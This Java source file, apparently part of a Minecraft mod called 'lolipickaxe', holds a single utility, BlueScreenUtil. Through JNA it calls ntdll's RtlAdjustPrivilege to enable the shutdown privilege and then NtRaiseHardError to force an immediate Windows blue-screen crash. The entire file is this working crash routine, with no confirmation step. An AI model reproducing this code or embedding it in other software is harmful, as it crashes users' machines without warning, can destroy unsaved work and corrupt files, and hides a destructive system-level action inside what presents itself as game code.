package net.xuyifei.lolipickaxe.common.util.bluescreen;

import com.sun.jna.Function;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.ptr.ByteByReference;
import com.sun.jna.ptr.IntByReference;
import com.sun.jna.win32.StdCallLibrary;

public class BlueScreenUtil {
    private static final int SE_SHUTDOWN_PRIVILEGE = 19;
    private static final int STATUS_FLOAT_MULTIPLE_FAULTS = 0xC00002B4;

    public interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        Pointer GetProcAddress(Pointer hModule, String lpProcName);
        Pointer LoadLibraryA(String lpLibFileName);
        Pointer GetModuleHandleA(String lpModuleName);
    }

    public static void blueScreen() {
        try {
            Pointer ntdll = Kernel32.INSTANCE.LoadLibraryA("ntdll.dll");
            if (Pointer.nativeValue(ntdll) == 0) {
                throw new DllLoadException("ntdll.dll");
            }

            Pointer pRtlAdjustPrivilege = Kernel32.INSTANCE.GetProcAddress(ntdll, "RtlAdjustPrivilege");

            Pointer pNtRaiseHardError = Kernel32.INSTANCE.GetProcAddress(
                    Kernel32.INSTANCE.GetModuleHandleA("ntdll.dll"),
                    "NtRaiseHardError"
            );

            if (pRtlAdjustPrivilege == null || pNtRaiseHardError == null) {
                throw new FunctionLoadException("RtlAdjustPrivilege and NtRaiseHardError");
            }

            Function adjustPrivilege = Function.getFunction(pRtlAdjustPrivilege);
            Function raiseHardError = Function.getFunction(pNtRaiseHardError);

            ByteByReference bEnabled = new ByteByReference();
            Object privResult = adjustPrivilege.invoke(
                    Integer.class,
                    new Object[] {
                            SE_SHUTDOWN_PRIVILEGE,
                            Boolean.TRUE,
                            Boolean.FALSE,
                            bEnabled
                    }
            );

            if (privResult instanceof Integer status) {
                if (status != 0) {
                    throw new RuntimeException("Failed to adjust privilege, error code: 0x" + Integer.toHexString(status));
                }
            }

            IntByReference uResp = new IntByReference();
            raiseHardError.invoke(
                    Integer.class,
                    new Object[] {
                            STATUS_FLOAT_MULTIPLE_FAULTS,
                            0,
                            0,
                            null,
                            6,
                            uResp
                    }
            );
        } catch (Exception e) {
            throw new RuntimeException("BlueScreen Failed! error:", e);
        }
    }
}
